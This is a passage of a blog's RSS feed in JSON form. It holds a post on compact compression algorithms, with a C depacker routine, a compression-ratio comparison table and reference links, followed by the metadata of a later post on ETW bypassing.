style=\"color: #333399; font-weight: bold;\">int</span> c;\n    \n    <span style=\"color: #008800; font-weight: bold;\">for</span>(c<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">1</span>; c<span style=\"color: #333333;\">&lt;</span>bits;) {\n      c <span style=\"color: #333333;\">=</span> (c<span style=\"color: #333333;\">+</span>c) <span style=\"color: #333333;\">+</span> DB(s, p <span style=\"color: #333333;\">+</span> c, bits<span style=\"color: #333333;\">==</span><span style=\"color: #0000DD; font-weight: bold;\">256</span>);\n    }\n    <span style=\"color: #008800; font-weight: bold;\">return</span> c <span style=\"color: #333333;\">-</span> bits;\n}\n\n<span style=\"color: #888888;\">// decode gamma</span>\n<span style=\"color: #008800; font-weight: bold;\">static</span> <span style=\"color: #333399; font-weight: bold;\">int</span> <span style=\"color: #0066BB; font-weight: bold;\">DG</span>(fr_state <span style=\"color: #333333;\">*</span>s, <span style=\"color: #333399; font-weight: bold;\">int</span> flag) {\n    <span style=\"color: #333399; font-weight: bold;\">int</span>     v, x <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span> c <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n    \n    v <span style=\"color: #333333;\">=</span> (<span style=\"color: #333333;\">-</span>flag <span style=\"color: #333333;\">&amp;</span> (<span style=\"color: #0000DD; font-weight: bold;\">547</span> <span style=\"color: #333333;\">-</span> <span style=\"color: #0000DD; font-weight: bold;\">291</span>)) <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">291</span>;\n    \n    <span style=\"color: #008800; font-weight: bold;\">do</span> {\n      c <span style=\"color: #333333;\">=</span> (c<span style=\"color: #333333;\">+</span>c) <span style=\"color: #333333;\">+</span> DB(s, v<span style=\"color: #333333;\">+</span>c, <span style=\"color: #0000DD; font-weight: bold;\">0</span>);\n      x <span style=\"color: #333333;\">=</span> (x<span style=\"color: #333333;\">+</span>x) <span style=\"color: #333333;\">+</span> DB(s, v<span style=\"color: #333333;\">+</span>c, <span style=\"color: #0000DD; font-weight: bold;\">0</span>);\n      c <span style=\"color: #333333;\">=</span> (c<span style=\"color: #333333;\">+</span>c) <span style=\"color: #333333;\">+</span> (x <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>);\n    } <span style=\"color: #008800; font-weight: bold;\">while</span>(c <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>);\n    \n    <span style=\"color: #008800; font-weight: bold;\">return</span> x;\n}\n\n<span style=\"color: #333399; font-weight: bold;\">uint32_t</span> <span style=\"color: #0066BB; font-weight: bold;\">fr_depack</span>(\n  <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>outbuf, \n  <span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">void</span> <span style=\"color: #333333;\">*</span>inbuf) \n{\n    <span style=\"color: #333399; font-weight: bold;\">int</span>      tmp, i, ofs, len, LWM;\n    <span style=\"color: #333399; font-weight: bold;\">uint8_t</span>  <span style=\"color: #333333;\">*</span>ptr, <span style=\"color: #333333;\">*</span>out <span style=\"color: #333333;\">=</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;\n    fr_state s;\n     \n    s.src  <span style=\"color: #333333;\">=</span> (<span style=\"color: #008800; font-weight: bold;\">const</span> <span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)inbuf;\n    s.len  <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">~</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n    s.val  <span style=\"color: #333333;\">=</span> REV(<span style=\"color: #333333;\">*</span>(<span style=\"color: #333399; font-weight: bold;\">uint32_t</span><span style=\"color: #333333;\">*</span>)s.src);\n    s.src <span style=\"color: #333333;\">+=</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>;\n    \n    <span style=\"color: #008800; font-weight: bold;\">for</span>(i<span style=\"color: #333333;\">=</span><span style=\"color: #0000DD; font-weight: bold;\">0</span>; i<span style=\"color: #333333;\">&lt;</span><span style=\"color: #0000DD; font-weight: bold;\">803</span>; i<span style=\"color: #333333;\">++</span>) s.pbs[i] <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">1024</span>;\n\n    <span style=\"color: #008800; font-weight: bold;\">for</span>(;;) {\n      LWM <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n      <span style=\"color: #888888;\">// decode literal</span>\n      <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> DT(<span style=\"color: #333333;\">&amp;</span>s, <span style=\"color: #0000DD; font-weight: bold;\">35</span>, <span style=\"color: #0000DD; font-weight: bold;\">256</span>);\n    <span style=\"color: #997700; font-weight: bold;\">fr_read_bit</span>:\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(<span style=\"color: #333333;\">!</span>DB(<span style=\"color: #333333;\">&amp;</span>s, LWM, <span style=\"color: #0000DD; font-weight: bold;\">0</span>)) <span style=\"color: #008800; font-weight: bold;\">continue</span>;\n      <span style=\"color: #888888;\">// decode match</span>\n      len <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>;\n      <span style=\"color: #888888;\">// use previous offset?</span>\n      <span style=\"color: #008800; font-weight: bold;\">if</span>(LWM <span style=\"color: #333333;\">||</span> <span style=\"color: #333333;\">!</span>DB(<span style=\"color: #333333;\">&amp;</span>s, <span style=\"color: #0000DD; font-weight: bold;\">2</span>, <span style=\"color: #0000DD; font-weight: bold;\">0</span>)) {\n        ofs <span style=\"color: #333333;\">=</span> DG(<span style=\"color: #333333;\">&amp;</span>s, <span style=\"color: #0000DD; font-weight: bold;\">0</span>);\n        <span style=\"color: #008800; font-weight: bold;\">if</span>(<span style=\"color: #333333;\">!</span>ofs) <span style=\"color: #008800; font-weight: bold;\">break</span>;\n        \n        len  <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>;\n        ofs  <span style=\"color: #333333;\">=</span> ((ofs <span style=\"color: #333333;\">-</span> <span style=\"color: #0000DD; font-weight: bold;\">2</span>) <span style=\"color: #333333;\">&lt;&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">4</span>); \n        tmp  <span style=\"color: #333333;\">=</span> ((ofs <span style=\"color: #333333;\">!=</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span> <span style=\"color: #333333;\">?</span> <span style=\"color: #333333;\">-</span><span style=\"color: #0000DD; font-weight: bold;\">1</span> <span style=\"color: #333333;\">:</span> <span style=\"color: #0000DD; font-weight: bold;\">0</span>) <span style=\"color: #333333;\">&amp;</span> <span style=\"color: #0000DD; font-weight: bold;\">16</span>) <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">3</span>;\n        ofs <span style=\"color: #333333;\">+=</span> DT(<span style=\"color: #333333;\">&amp;</span>s, tmp, <span style=\"color: #0000DD; font-weight: bold;\">16</span>) <span style=\"color: #333333;\">+</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n        \n        len <span style=\"color: #333333;\">-=</span> (ofs <span style=\"color: #333333;\">&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">2048</span>);\n        len <span style=\"color: #333333;\">-=</span> (ofs <span style=\"color: #333333;\">&lt;</span> <span style=\"color: #0000DD; font-weight: bold;\">96</span>);\n      }\n      LWM  <span style=\"color: #333333;\">=</span> <span style=\"color: #0000DD; font-weight: bold;\">1</span>;\n      len <span style=\"color: #333333;\">+=</span> DG(<span style=\"color: #333333;\">&amp;</span>s, <span style=\"color: #0000DD; font-weight: bold;\">1</span>);\n      ptr  <span style=\"color: #333333;\">=</span> out <span style=\"color: #333333;\">-</span> ofs;\n      \n      <span style=\"color: #008800; font-weight: bold;\">while</span>(len<span style=\"color: #333333;\">--</span>) <span style=\"color: #333333;\">*</span>out<span style=\"color: #333333;\">++</span> <span style=\"color: #333333;\">=</span> <span style=\"color: #333333;\">*</span>ptr<span style=\"color: #333333;\">++</span>;\n      <span style=\"color: #008800; font-weight: bold;\">goto</span> fr_read_bit;\n    }\n    <span style=\"color: #008800; font-weight: bold;\">return</span> out <span style=\"color: #333333;\">-</span> (<span style=\"color: #333399; font-weight: bold;\">uint8_t</span><span style=\"color: #333333;\">*</span>)outbuf;\n}\n</pre>\n</div>\n<h2 id=\"results\">13. Results</h2>\n<p>The following table, while ordered by ratio, is NOT a rank order and shouldn&#8217;t be interpreted that way. It wouldn&#8217;t be fair to judge the algorithms based on my criteria, that is: lightweight decompressor, high compression ratio, open source. The ratios are based on compressing a 1MB PE file for Windows without any additional trickery.</p>\n<table id=\"t02\">\n<tr>\n<th>Algorithm</th>\n<th>RAM (Bytes)</th>\n<th>ROM (Bytes)</th>\n<th>Ratio</th>\n</tr>\n<tr>\n<td>LZ77</td>\n<td>0</td>\n<td>54</td>\n<td>32%</td>\n</tr>\n<tr>\n<td>ZX7 Mini</td>\n<td>0</td>\n<td>67</td>\n<td>36%</td>\n</tr>\n<tr>\n<td>LZSS</td>\n<td>0</td>\n<td>69</td>\n<td>40%</td>\n</tr>\n<tr>\n<td>LZ4</td>\n<td>0</td>\n<td>80</td>\n<td>43%</td>\n</tr>\n<tr>\n<td>ULZ</td>\n<td>0</td>\n<td>124</td>\n<td>44%</td>\n</tr>\n<tr>\n<td>LZE</td>\n<td>0</td>\n<td>97</td>\n<td>45%</td>\n</tr>\n<tr>\n<td>ZX7</td>\n<td>0</td>\n<td>81</td>\n<td>46%</td>\n</tr>\n<tr>\n<td>MegaLZ</td>\n<td>0</td>\n<td>117</td>\n<td>46%</td>\n</tr>\n<tr>\n<td>BriefLZ</td>\n<td>0</td>\n<td>92</td>\n<td>46%</td>\n</tr>\n<tr>\n<td>LZSA1</td>\n<td>0</td>\n<td>96</td>\n<td>46%</td>\n</tr>\n<tr>\n<td>LZSA2</td>\n<td>0</td>\n<td>187</td>\n<td>50%</td>\n</tr>\n<tr>\n<td>NRV2b</td>\n<td>0</td>\n<td>115</td>\n<td>51%</td>\n</tr>\n<tr>\n<td>LZOMA</td>\n<td>0</td>\n<td>238</td>\n<td>54%</td>\n</tr>\n<tr>\n<td>Shrinkler</td>\n<td>4096</td>\n<td>235</td>\n<td>55%</td>\n</tr>\n<tr>\n<td>KKrunchy</td>\n<td>3212</td>\n<td>639 (compiler generated)</td>\n<td>55%</td>\n</tr>\n<tr>\n<td>LZMA</td>\n<td>16384</td>\n<td>1265 (compiler generated)</td>\n<td>58%</td>\n</tr>\n</table>\n<h2 id=\"sum\">14. Summary</h2>\n<p>One could surely write a book about compression algorithms used by the Demoscene. And it\u2019s safe to say I\u2019ve only scraped the surface on this subject. For example, there is no analysis of compression and decompression speed of implementations for the x86 or other architectures. My primary concern at the moment is in the compression ratio and code size.</p>\n<h2 id=\"ack\">15. Acknowledgements</h2>\n<p>A number of people helped directly or indirectly with this post.</p>\n<ul>\n<li><a href=\"https://www.canterbury.ac.nz/engineering/contact-us/people/tim-bell.html\">Tim Bell</a> for LZB and information about the Stac Electronics lawsuit.</li>\n<li><a href=\"https://github.com/askeksa\">Blueberry</a> for optimization tips and fixing my initial 68K translation of Shrinkler.</li>\n<li><a href=\"https://github.com/peterferrie\">Qkumba</a> for fixing x86 translation, translation of Exomizer and 6502 depackers.</li>\n<li><a href=\"https://github.com/mobygamer\">Trixter</a> for 8088 depackers.</li>\n<li><a href=\"https://github.com/specke\">Introspec</a> for Z80 depackers and impressive knowledge of LZ variations.</li>\n<li><a href=\"https://github.com/emmanuel-marty\">Emmanuel Marty</a> for aPUltra, LZSA, and helping with x86 decoder for aPLib.</li>\n</ul>\n<h2 id=\"res\">16. Further Research</h2>\n<p>To save you time locating information about some of the topics discussed in this post, I&#8217;ve included some links to get you started.</p>\n<h2 id=\"dox\">16.1 Documentaries and Interviews</h2>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=5MexnBunH_g\">Documentary on the 80s and 90s Demoscene: The Art Of The Algorithms</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=CvV8OBbnwLU\">The Demoscene &#8211; Algorithm to Art</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=1XZ9dZIr7Cw\">Freax &#8211; history of the demoscene</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=xxjcU9x-nAw\">Demographics: Behind the Scene (Part 1 of 2)</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=JTLpbyu8iDM\">Demographics: Behind the Scene (Part 2 of 2)</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=alp5NobGPuo\">Handmade Dev Show &#8211; Fabian Giesen</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=VYK-xMm11S0\">HandmadeCon 2016 &#8211; Compression Followup &#8211; Charles Bloom</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=CAv6dY-VS-4\">Computers history &#8211; Gary Kildall documentary ( 1995 )</a></li>\n</ul>\n<h2 id=\"sites\">16.2 Websites, Blogs and Forums</h2>\n<ul>\n<li><a href=\"http://mattmahoney.net/dc/dce.html\">Data Compression Explained</a></li>\n<li><a href=\"https://ethw.org/History_of_Lossless_Data_Compression_Algorithms\">History of Lossless Data Compression Algorithms</a></li>\n<li><a href=\"https://encode.su/\">Encode&#8217;s Forum (about data compression)</a></li>\n<li><a href=\"https://cbloomrants.blogspot.com/\">Charles Bloom</a></li>\n<li><a href=\"https://fgiesen.wordpress.com/\">Fabian Giesen</a></li>\n<li><a href=\"https://www.demoscene.info/\">Demoscene.info</a></li>\n<li><a href=\"https://www.pouet.net/\">Pouet</a></li>\n<li><a href=\"http://olivier.poudade.free.fr/\">Olivier Poudade&#8217;s Assembly language page</a></li>\n<li><a href=\"https://www.fadden.com/apple2/hdc/index.html\">Hacking Data Compression</a> by Andy McFadden.</li>\n<li><a href=\"http://code4k.blogspot.com/2010/12/crinkler-secrets-4k-intro-executable.html\">Crinkler secrets, 4k intro executable compressor at its best</a>.</li>\n</ul>\n<h2 id=\"demos\">16.3 Demoscene Productions</h2>\n<p>This is not a &#8220;best of&#8221; list or what my favorites are. It&#8217;s mainly from some youtube recommendations and please don&#8217;t take offense If I didn&#8217;t include your demo. Contact me if you feel I&#8217;ve missed any.</p>\n<ul>\n<li><a href=\"https://www.youtube.com/watch?v=gX7ESVZ7T6Y\">Mercury &#8211; Fermi Paradox</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=wir8sSDfW5Q\">Gaia Machina &#8211; Approximate</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=LGm33hsXP9w\">Monolith &#8211; ASD</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=yOYRWJEAJTM\">Photon &#8211; Fairlight</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=WBuoyegCeXI\">Mercury &#8211; Luma</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=rWwNgVwQG1A\">Logicoma &#8211; Elysian</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=ie4u2i_5OdE\">Mercury &#8211; The Timeless</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=jB0vBmiTr6o\">elevated by Rgba &amp; TBC</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=rZI6MQmmTYY\">Loonies &#8211; One Of Those Days</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=GjuridCR2Fo\">Logicoma &#8211; Engage</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=mjzeP7hYyNo\">Offscreen Colonies &#8211; Conspiracy</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=0w_xEUoK79o\">Hartverdrahtet &#8211; Akronyme Analogiker</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=wqu_IpkOYBg\">Farbrausch &#8211; fr-041: debris</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=2-7zCKYmQoM\">Logicoma &#8211; Backscatter</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=r8Lm9CoxEHg\">Logicoma &#8211; Wrecklamation</a></li>\n</ul>\n<h2 id=\"tools\">16.4 Tools</h2>\n<ul>\n<li><a href=\"http://corpus.canterbury.ac.nz/\">The Canterbury Corpus</a></li>\n<li><a href=\"https://github.com/inikep/lzbench\">lzbench</a></li>\n<li><a href=\"https://github.com/powturbo/TurboBench\">turbobench</a></li>\n</ul>\n<h2 id=\"other\">16.5 Other Compression Algorithms</h2>\n<p>The following table, while ordered by ratio, is NOT a rank order and shouldn\u2019t be interpreted that way. It wouldn\u2019t be fair to judge the algorithms based on my criteria, which is a lightweight decompressor, high compression ratio, open-source. The compression ratios are from compressing a 1MB PE file for Windows.</p>\n<p><!-- START OF GOOD ALGORITHMS --></p>\n<p><h2 id=\"good\">OK/Good (~25-39%)</h2>\n<table id=\"t01\">\n<tr>\n<th>Library / API / Algorithm</th>\n<th>Ratio</th>\n<th>Link</th>\n</tr>\n<tr>\n<td>zpack</td>\n<td>24%</td>\n<td><a href=\"https://github.com/zerkman/zpacker\" rel=\"nofollow\">https://github.com/zerkman/zpacker</a></td>\n</tr>\n<tr>\n<td>PPP</td>\n<td>27%</td>\n<td><a href=\"https://tools.ietf.org/html/rfc1978\" rel=\"nofollow\">https://tools.ietf.org/html/rfc1978</a></td>\n</tr>\n<tr>\n<td>JQCoding</td>\n<td>27%</td>\n<td><a href=\"https://encode.su/threads/2157-Looking-for-a-super-simple-decompressor?p=43099&#038;viewfull=1#post43099\" rel=\"nofollow\">https://encode.su/threads/2157-Looking-for-a-super-simple-decompressor?p=43099&#038;viewfull=1#post43099</a></td>\n</tr>\n<tr>\n<td>LZJB</td>\n<td>28%</td>\n<td><a href=\"https://github.com/nemequ/lzjb\" rel=\"nofollow\">https://github.com/nemequ/lzjb</a></td>\n</tr>\n<tr>\n<td>LZRW1</td>\n<td>31%</td>\n<td><a href=\"http://ross.net/compression/lzrw1.html\" rel=\"nofollow\">http://ross.net/compression/lzrw1.html</a></td>\n</tr>\n<tr>\n<td>LZ48</td>\n<td>31%</td>\n<td><a href=\"http://www.cpcwiki.eu/forum/programming/lz48-cruncherdecruncher/\" rel=\"nofollow\">http://www.cpcwiki.eu/forum/programming/lz48-cruncherdecruncher/</a></td>\n</tr>\n<tr>\n<td>LZ77</td>\n<td>32%</td>\n<td><a href=\"https://github.com/andyherbert/lz1\" rel=\"nofollow\">https://github.com/andyherbert/lz1</a></td>\n</tr>\n<tr>\n<td>LZW</td>\n<td>33%</td>\n<td><a href=\"https://github.com/vapier/ncompress\" rel=\"nofollow\">https://github.com/vapier/ncompress</a></td>\n</tr>\n<tr>\n<td>LZP1</td>\n<td>34%</td>\n<td><a href=\"http://www.hugi.scene.org/online/coding/hugi%2012%20-%20colzp.htm\" rel=\"nofollow\">http://www.hugi.scene.org/online/coding/hugi%2012%20-%20colzp.htm</a></td>\n</tr>\n<tr>\n<td>Kitty</td>\n<td>34%</td>\n<td><a href=\"https://encode.su/threads/2174-Kitty-file-compressor-(Super-small-compressor)\" rel=\"nofollow\">https://encode.su/threads/2174-Kitty-file-compressor-(Super-small-compressor)</a></td>\n</tr>\n<tr>\n<td>LZ49</td>\n<td>35%</td>\n<td><a href=\"http://www.cpcwiki.eu/forum/programming/lz48-cruncherdecruncher/\" rel=\"nofollow\">http://www.cpcwiki.eu/forum/programming/lz48-cruncherdecruncher/</a></td>\n</tr>\n<tr>\n<td>LZ4X</td>\n<td>36%</td>\n<td><a href=\"https://github.com/encode84/lz4x\" rel=\"nofollow\">https://github.com/encode84/lz4x</a></td>\n</tr>\n<tr>\n<td>QuickLZ</td>\n<td>36%</td>\n<td><a href=\"http://www.quicklz.com/\" rel=\"nofollow\">http://www.quicklz.com/</a></td>\n</tr>\n<tr>\n<td>ZX7mini</td>\n<td>36%</td>\n<td><a href=\"https://github.com/antoniovillena/zx7mini\" rel=\"nofollow\">https://github.com/antoniovillena/zx7mini</a></td>\n</tr>\n<tr>\n<td>RtlDecompressBuffer (LZNT1)</td>\n<td>36%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>Decompress (Xpress)</td>\n<td>37%</td>\n<td>Windows OS.</td>\n</tr>\n</table>\n<p><!-- START OF VERY GOOD ALGORITHMS --></p>\n<h2 id=\"verygood\">Very Good (40-49%)</h2>\n<table id=\"t01\">\n<tr>\n<th>Library / API / Algorithm</th>\n<th>Ratio</th>\n<th>Link</th>\n</tr>\n<tr>\n<td>LZSS</td>\n<td>40%</td>\n<td><a href=\"https://github.com/kieselsteini/lzss\" rel=\"nofollow\">https://github.com/kieselsteini/lzss</a></td>\n</tr>\n<tr>\n<td>LZF</td>\n<td>40%</td>\n<td><a href=\"https://encode.su/threads/1819-LZF-Optimized-LZF-compressor\" rel=\"nofollow\">https://encode.su/threads/1819-LZF-Optimized-LZF-compressor</a></td>\n</tr>\n<tr>\n<td>LZM</td>\n<td>41%</td>\n<td><a href=\"https://github.com/r-lyeh/stdarc.c\" rel=\"nofollow\">https://github.com/r-lyeh/stdarc.c</a></td>\n</tr>\n<tr>\n<td>RtlDecompressBuffer (Xpress)</td>\n<td>43%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>BLZ4</td>\n<td>43%</td>\n<td><a href=\"https://github.com/jibsen/blz4\" rel=\"nofollow\">https://github.com/jibsen/blz4</a></td>\n</tr>\n<tr>\n<td>LZ4Ultra</td>\n<td>43%</td>\n<td><a href=\"https://github.com/emmanuel-marty/lz4ultra\" rel=\"nofollow\">https://github.com/emmanuel-marty/lz4ultra</a></td>\n</tr>\n<tr>\n<td>ULZ</td>\n<td>44%</td>\n<td><a href=\"https://github.com/encode84/ulz\" rel=\"nofollow\">https://github.com/encode84/ulz</a></td>\n</tr>\n<tr>\n<td>BitBuster</td>\n<td>44%</td>\n<td><a href=\"https://www.teambomba.net/bombaman/downloadd26a.html\" rel=\"nofollow\">https://www.teambomba.net/bombaman/downloadd26a.html</a></td>\n</tr>\n<tr>\n<td>LZE</td>\n<td>45%</td>\n<td><a href=\"http://gorry.haun.org/pw/?lze\" rel=\"nofollow\">http://gorry.haun.org/pw/?lze</a></td>\n</tr>\n<tr>\n<td>Decompress (Xpress Huffman)</td>\n<td>45%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>ZX7</td>\n<td>45%</td>\n<td><a href=\"http://www.worldofspectrum.org/infoseekid.cgi?id=0027996\" rel=\"nofollow\">http://www.worldofspectrum.org/infoseekid.cgi?id=0027996</a></td>\n</tr>\n<tr>\n<td>LZMAT</td>\n<td>45%</td>\n<td><a href=\"http://www.matcode.com/lzmat.htm\" rel=\"nofollow\">http://www.matcode.com/lzmat.htm</a></td>\n</tr>\n<tr>\n<td>CRUSH</td>\n<td>45%</td>\n<td><a href=\"https://sourceforge.net/projects/crush/\" rel=\"nofollow\">https://sourceforge.net/projects/crush/</a></td>\n</tr>\n<tr>\n<td>Hrust</td>\n<td>46%</td>\n<td><a href=\"https://github.com/specke/ohc\" rel=\"nofollow\">https://github.com/specke/ohc</a></td>\n</tr>\n<tr>\n<td>MegaLZ</td>\n<td>46%</td>\n<td><a href=\"http://os4depot.net/index.php?function=showfile&#038;file=development/cross/megalz.lha\" rel=\"nofollow\">http://os4depot.net/index.php?function=showfile&#038;file=development/cross/megalz.lha</a></td>\n</tr>\n<tr>\n<td>LZSA1</td>\n<td>46%</td>\n<td><a href=\"https://github.com/emmanuel-marty/lzsa\" rel=\"nofollow\">https://github.com/emmanuel-marty/lzsa</a></td>\n</tr>\n<tr>\n<td>BriefLZ</td>\n<td>46%</td>\n<td><a href=\"https://github.com/jibsen/brieflz\" rel=\"nofollow\">https://github.com/jibsen/brieflz</a></td>\n</tr>\n<tr>\n<td>apUltra</td>\n<td>47%</td>\n<td><a href=\"https://github.com/emmanuel-marty/apultra\" rel=\"nofollow\">https://github.com/emmanuel-marty/apultra</a></td>\n</tr>\n<tr>\n<td>Pletter5</td>\n<td>47%</td>\n<td><a href=\"http://www.xl2s.tk/\" rel=\"nofollow\">http://www.xl2s.tk/</a></td>\n</tr>\n<tr>\n<td>Pucrunch</td>\n<td>48%</td>\n<td><a href=\"https://github.com/mist64/pucrunch\" rel=\"nofollow\">https://github.com/mist64/pucrunch</a></td>\n</tr>\n<tr>\n<td>SR2</td>\n<td>48%</td>\n<td><a href=\"http://mattmahoney.net/dc/#sr2\" rel=\"nofollow\">http://mattmahoney.net/dc/#sr2</a></td>\n</tr>\n</table>\n<p><!-- START OF EXCELLENT ALGORITHMS --></p>\n<h2 id=\"excellent\">Excellent  (50% &gt;)</h2>\n<table id=\"t01\">\n<tr>\n<th>Library / API / Algorithm</th>\n<th>Ratio</th>\n<th>Link</th>\n</tr>\n<tr>\n<td>BCRUSH</td>\n<td>50%</td>\n<td><a href=\"https://github.com/jibsen/bcrush\" rel=\"nofollow\">https://github.com/jibsen/bcrush</a></td>\n</tr>\n<tr>\n<td>LZSA2</td>\n<td>50%</td>\n<td><a href=\"https://github.com/emmanuel-marty/lzsa\" rel=\"nofollow\">https://github.com/emmanuel-marty/lzsa</a></td>\n</tr>\n<tr>\n<td>RtlDecompressBufferEx (Xpress Huffman)</td>\n<td>50%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>Decompress (MSZip)</td>\n<td>51%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>Exomizer</td>\n<td>51%</td>\n<td><a href=\"https://bitbucket.org/magli143/exomizer/wiki/Home\" rel=\"nofollow\">https://bitbucket.org/magli143/exomizer/wiki/Home</a></td>\n</tr>\n<tr>\n<td>aPLib</td>\n<td>51%</td>\n<td><a href=\"http://ibsensoftware.com/products_aPLib.html\" rel=\"nofollow\">http://ibsensoftware.com/products_aPLib.html</a></td>\n</tr>\n<tr>\n<td>JCALG1</td>\n<td>52%</td>\n<td><a href=\"https://bitsum.com/portfolio/jcalg1/\" rel=\"nofollow\">https://bitsum.com/portfolio/jcalg1/</a></td>\n</tr>\n<tr>\n<td>NRV2B</td>\n<td>52%</td>\n<td><a href=\"http://www.oberhumer.com/opensource/ucl/\" rel=\"nofollow\">http://www.oberhumer.com/opensource/ucl/</a></td>\n</tr>\n<tr>\n<td>BALZ</td>\n<td>53%</td>\n<td><a href=\"https://sourceforge.net/projects/balz/\" rel=\"nofollow\">https://sourceforge.net/projects/balz/</a></td>\n</tr>\n<tr>\n<td>Decompress (LZMS)</td>\n<td>54%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>LZOMA</td>\n<td>54%</td>\n<td><a href=\"https://github.com/alef78/lzoma\" rel=\"nofollow\">https://github.com/alef78/lzoma</a></td>\n</tr>\n<tr>\n<td>KKrunchy</td>\n<td>55%</td>\n<td><a href=\"https://github.com/farbrausch/fr_public\" rel=\"nofollow\">https://github.com/farbrausch/fr_public</a></td>\n</tr>\n<tr>\n<td>Shrinkler</td>\n<td>55%</td>\n<td><a href=\"https://github.com/askeksa/Shrinkler\" rel=\"nofollow\">https://github.com/askeksa/Shrinkler</a></td>\n</tr>\n<tr>\n<td>NLZM</td>\n<td>55%</td>\n<td><a href=\"https://github.com/nauful/NLZM\" rel=\"nofollow\">https://github.com/nauful/NLZM</a></td>\n</tr>\n<tr>\n<td>BCM</td>\n<td>55%</td>\n<td><a href=\"https://github.com/encode84/bcm\" rel=\"nofollow\">https://github.com/encode84/bcm</a></td>\n</tr>\n<tr>\n<td>D3DDecompressShaders (DXT/BC)</td>\n<td>57%</td>\n<td>Windows OS</td>\n</tr>\n<tr>\n<td>Packfire</td>\n<td>57%</td>\n<td><a href=\"http://neural.untergrund.net/\" rel=\"nofollow\">http://neural.untergrund.net/</a></td>\n</tr>\n<tr>\n<td>LZMA</td>\n<td>58%</td>\n<td><a href=\"https://www.7-zip.org/sdk.html\" rel=\"nofollow\">https://www.7-zip.org/sdk.html</a></td>\n</tr>\n<tr>\n<td>PAQ8F</td>\n<td>70%</td>\n<td><a href=\"http://mattmahoney.net/dc/paq.html\" rel=\"nofollow\">http://mattmahoney.net/dc/paq.html</a></td>\n</tr>\n</table>\n<p><!-- END OF ALGORITHMS --></p>"
                }
            ],
            "wfw_commentrss": "https://modexp.wordpress.com/2020/05/27/komposite-shellcode/feed/",
            "slash_comments": "2",
            "media_thumbnail": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/05/nrv2b.png"
                }
            ],
            "href": "",
            "media_content": [
                {
                    "url": "https://modexp.files.wordpress.com/2020/05/nrv2b.png",
                    "medium": "image"
                },
                {
                    "url": "https://0.gravatar.com/avatar/6505a0ec0ae84dac45856b91b0cc2343?s=96&d=identicon&r=G",
                    "medium": "image"
                }
            ]
        },
        {
            "title": "Another method of bypassing ETW and Process Injection via ETW registration entries.",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://modexp.wordpress.com/feed/",
                "value": "Another method of bypassing ETW and Process Injection via ETW registration entries."
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://modexp.wordpress.com/2020/04/08/red-teams-etw/"
                }
            ],
            "link": "https://modexp.wordpress.com/2020/04/08/red-teams-etw/",
            "comments": "https://modexp.wordpress.com/2020/04/08/red-teams-etw/#comments",
            "authors": [
                {
                    "name": "odzhan"
                }
            ],
            "author": "odzhan",
            "author_detail": {
                "name": "odzhan"
            },
            "published": "Wed, 08 Apr 2020 18:00:59 +0000",
            "published_parsed": [
                2020,
                4,
                8,
                18,
                0,
                59,
                2,
                99,
                0
            ],
            "tags": [
                {
                    "term": "etw",
